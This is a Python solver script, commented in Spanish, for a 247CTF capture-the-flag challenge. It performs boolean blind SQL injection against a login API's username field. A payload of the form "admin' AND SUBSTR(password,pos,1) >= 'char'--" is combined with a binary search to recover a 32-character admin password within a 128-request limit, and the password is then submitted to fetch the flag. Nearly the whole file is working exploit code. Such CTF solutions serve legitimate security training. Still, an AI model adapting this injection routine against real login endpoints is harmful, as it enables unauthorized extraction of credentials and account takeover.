#!/usr/bin/env python3
"""
247CTF - Flag API Key Solver
Blind SQL Injection con búsqueda binaria

Vulnerabilidad: SQL Injection en campo username
Restricción: Solo 128 requests por token
Solución: Búsqueda binaria (4 queries/char × 32 chars = 128 exactos)
"""

import requests

URL = "https://3eb960aa2742e589.247ctf.com/api/login"
HEX_CHARS = "0123456789abcdef"

def get_token():
    """Obtiene nuevo token API (resetea el password del admin)"""
    r = requests.get("https://3eb960aa2742e589.247ctf.com/api/get_token")
    token = r.json()["message"].split(" ")[-1].rstrip("!")
    print(f"[*] Nuevo token: {token}")
    return token

def check_gte(api, prefix, char):
    """
    Verifica si password[len(prefix)] >= char usando SUBSTR
    Payload: admin' AND SUBSTR(password,pos,1) >= 'char'--
    """
    pos = len(prefix) + 1  # SQL usa 1-indexing
    payload = f"admin' AND SUBSTR(password,{pos},1) >= '{char}'--"
    r = requests.post(URL, data={"username": payload, "password": "x", "api": api})
    return r.json()["result"] == "success"

def binary_search_char(api, prefix, requests_count):
    """
    Encuentra el caracter en posición len(prefix) usando búsqueda binaria
    Máximo 4 queries por caracter (log2(16) = 4)
    """
    chars = list(HEX_CHARS)
    low, high = 0, len(chars) - 1

    while low < high:
        mid = (low + high + 1) // 2
        requests_count[0] += 1
        if check_gte(api, prefix, chars[mid]):
            low = mid
        else:
            high = mid - 1

    return chars[low]

def extract_password():
    """Extrae los 32 caracteres del password usando búsqueda binaria"""
    api = get_token()
    password = ""
    requests_count = [0]

    for pos in range(32):
        c = binary_search_char(api, password, requests_count)
        password += c
        print(f"[+] Pos {pos:2d}: {c} -> {password} (requests: {requests_count[0]})")

    return password, requests_count[0]

def get_flag(password):
    """Obtiene el flag usando el password extraído"""
    r = requests.post("https://3eb960aa2742e589.247ctf.com/api/get_flag",
                      data={"password": password})
    return r.json()

if __name__ == "__main__":
    # Extraer password mediante Blind SQLi
    password, count = extract_password()
    print(f"\n[+] Password completo: {password}")
    print(f"[+] Total requests: {count}")

    # Obtener flag
    print("\n[*] Obteniendo flag...")
    result = get_flag(password)

    if result["result"] == "success":
        print(f"[+] FLAG: {result['message']}")
    else:
        print(f"[-] Error: {result}")
